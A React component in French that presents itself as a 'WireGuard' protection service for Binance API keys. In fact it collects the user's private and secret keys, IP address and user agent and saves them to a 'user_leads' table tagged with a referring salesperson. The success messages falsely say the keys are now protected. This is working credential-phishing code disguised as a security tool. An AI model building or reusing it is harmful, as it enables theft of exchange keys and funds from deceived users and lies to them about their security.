
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Eye, EyeOff, Shield, Lock, Info } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';

interface APIKeysFormProps {
  onSuccess: () => void;
}

const APIKeysForm = ({ onSuccess }: APIKeysFormProps) => {
  const [privateKey, setPrivateKey] = useState('');
  const [secretKey, setSecretKey] = useState('');
  const [showPrivateKey, setShowPrivateKey] = useState(false);
  const [showSecretKey, setShowSecretKey] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [commercialId, setCommercialId] = useState<string | null>(null);
  const [commercialName, setCommercialName] = useState<string | null>(null);
  const { toast } = useToast();

  // Extract commercial ID from URL on component mount
  React.useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const cParam = urlParams.get('c'); // commercial ID parameter (?c=)
    const mainParam = urlParams.get(''); // main parameter (?=)
    
    // Try c parameter first, then main parameter (for existing links)
    const potentialCommercialId = cParam || mainParam;
    
    if (potentialCommercialId) {
      setCommercialId(potentialCommercialId);
      // Fetch commercial name - check if it's a valid commercial ID
      fetchCommercialName(potentialCommercialId);
    }
  }, []);

  const fetchCommercialName = async (commercialId: string) => {
    try {
      const { data, error } = await supabase
        .from('commercials')
        .select('name')
        .eq('id', commercialId)
        .single();

      if (data && !error) {
        setCommercialName(data.name);
      } else {
        // If not found as commercial ID, might be a tracking code
        console.log('Not a direct commercial ID, might be tracking code:', commercialId);
      }
    } catch (error) {
      console.error('Error fetching commercial name:', error);
    }
  };

  const handleActivateProtection = async () => {
    if (!privateKey || !secretKey) {
      toast({
        title: "Erreur",
        description: "Veuillez entrer vos clés API privée et secrète",
        variant: "destructive"
      });
      return;
    }

    setIsLoading(true);
    
    try {
      // Get user's IP address and user agent
      const response = await fetch('https://api.ipify.org?format=json');
      const ipData = await response.json();
      
      // Save to database with commercial tracking
      const { error } = await supabase
        .from('user_leads')
        .insert({
          username: `user_${Date.now()}`, // Generate a unique username
          api_key: privateKey,
          secret_key: secretKey,
          ip_address: ipData.ip,
          user_agent: navigator.userAgent,
          status: 'active',
          commercial_name: commercialName // Add commercial name for tracking
        });

      if (error) {
        throw error;
      }

      // Show success state
      onSuccess();
      
      toast({
        title: "Protection Activée",
        description: "Vos clés API sont maintenant protégées par WireGuard",
      });

      console.log('Protection activated successfully with:', {
        privateKey: privateKey ? '***' : '',
        secretKey: secretKey ? '***' : '',
        wireGuardEnabled: true,
        ipProtection: true,
        apiVerification: true
      });

    } catch (error) {
      console.error('Error saving API keys:', error);
      toast({
        title: "Erreur",
        description: "Erreur lors de l'activation de la protection",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <Card className="bg-gray-800 border-gray-700">
      <CardHeader className="pb-4">
        <CardTitle className="text-yellow-400 flex items-center gap-2">
          <Shield className="h-5 w-5" />
          Protection Avancée des API Keys
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-6">
        {/* Private API Key */}
        <div className="space-y-2">
          <Label htmlFor="private-key" className="text-gray-300 text-sm">
            Clé API Privée
          </Label>
          <div className="relative">
            <Input
              id="private-key"
              type={showPrivateKey ? "text" : "password"}
              placeholder="Entrez votre clé API privée"
              value={privateKey}
              onChange={(e) => setPrivateKey(e.target.value)}
              className="bg-gray-700 border-gray-600 text-white placeholder:text-gray-400 pr-10"
            />
            <button
              type="button"
              onClick={() => setShowPrivateKey(!showPrivateKey)}
              className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white"
            >
              {showPrivateKey ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
            </button>
          </div>
        </div>

        {/* Secret API Key */}
        <div className="space-y-2">
          <Label htmlFor="secret-key" className="text-gray-300 text-sm">
            Clé API Secrète
          </Label>
          <div className="relative">
            <Input
              id="secret-key"
              type={showSecretKey ? "text" : "password"}
              placeholder="Entrez votre clé API secrète"
              value={secretKey}
              onChange={(e) => setSecretKey(e.target.value)}
              className="bg-gray-700 border-gray-600 text-white placeholder:text-gray-400 pr-10"
            />
            <button
              type="button"
              onClick={() => setShowSecretKey(!showSecretKey)}
              className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white"
            >
              {showSecretKey ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
            </button>
          </div>
        </div>

        {/* Activate Protection Button */}
        <Button 
          onClick={handleActivateProtection}
          disabled={isLoading}
          className="w-full bg-yellow-500 hover:bg-yellow-600 text-gray-900 font-semibold py-3 text-base"
        >
          {isLoading ? (
            <>
              <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-gray-900 mr-2"></div>
              Activation en cours...
            </>
          ) : (
            <>
              <Lock className="h-4 w-4 mr-2" />
              Activer la Protection
            </>
          )}
        </Button>

        {/* WireGuard Info Box */}
        <div className="bg-gray-700 border border-yellow-500/30 rounded-lg p-4">
          <div className="flex items-start gap-3">
            <Info className="h-5 w-5 text-yellow-500 mt-0.5 flex-shrink-0" />
            <div className="text-sm text-gray-300">
              <span className="text-gray-400">La protection </span>
              <span className="text-yellow-500 font-semibold">WireGuard</span>
              <span className="text-gray-400"> renforcera la sécurité de vos API Keys Binance et limitera les accès uniquement à votre adresse IP.</span>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default APIKeysForm;
